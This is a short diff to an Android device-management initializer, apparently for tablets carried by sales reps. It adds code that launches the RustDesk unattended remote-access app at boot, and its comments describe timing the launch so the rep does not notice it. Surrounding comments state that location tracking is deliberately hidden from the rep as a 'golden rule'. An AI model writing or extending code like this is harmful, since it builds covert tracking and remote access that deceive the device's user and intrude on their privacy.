@@ -181,6 +181,17 @@ public class Initializer {
         // hidden by the disabled status bar above, so the rep sees no tracking sign (golden rule).
         startLocationService(context, settingsHelper);
 
+        // Phoenix custom build: start the unattended remote-access app (RustDesk) on the boot/enrol
+        // path so it is running and reachable without the rep — this is what gets it back after a
+        // reboot. Only here, never on the hourly sync, so it does not flash open while the rep is
+        // using the tablet. Inert when the app is not installed or the setting is "off".
+        try {
+            Utils.startRemoteAccessApp(context,
+                    settingsHelper.getAppPreference(context.getPackageName(), Utils.REMOTE_ACCESS_PACKAGE_SETTING));
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
         // Send pending logs to server
         RemoteLogger.sendLogsToServer(context);
 
